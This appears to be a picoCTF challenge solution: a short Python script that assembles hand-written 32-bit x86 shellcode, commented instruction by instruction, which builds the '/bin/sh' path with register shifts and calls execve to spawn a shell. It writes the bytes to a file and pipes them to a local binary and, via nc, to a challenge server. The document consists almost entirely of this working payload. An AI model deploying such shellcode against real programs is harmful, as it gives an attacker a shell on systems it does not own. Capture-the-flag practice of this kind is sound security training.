# shellcode
sc = b"" 
# xor ebx, ebx ; mov bl, 0x68
sc += b'1\xdb\xb3h'
# "shl ebx" * 16
sc += b'\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3'
# mov bh, 0x73 ; mov bl, 0x2f
sc += b'\xb7s\xb3/'
sc += b'\x90'
# push ebx
sc += b'S'
# mov bh, 0x6e; mov bl, 0x69
sc += b'\xb7n\xb3i'
# "shl ebx" * 16
sc += b'\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3\xd1\xe3'
# mov bh, 0x62; mov bl, 0x2f
sc += b'\xb7b\xb3/'
sc += b'\x90'
# push ebx
sc += b'S'
# mov ebx, esp
sc += b'\x89\xe3'
# xor ecx, ecx
sc += b'1\xc9'
# xor edx, edx
sc += b'1\xd2'
# xor eax, eax
sc += b'1\xc0'
# mov al, 0xb
sc += b'\xb0\x0b'
# int 0x80
sc += b'\xcd\x80'
sc += b'\n'

open("shellcode","wb").write(sc)
# (cat shellcode -)| ./fun
# (cat shellcode -)| nc wily-courier.picoctf.net 60701
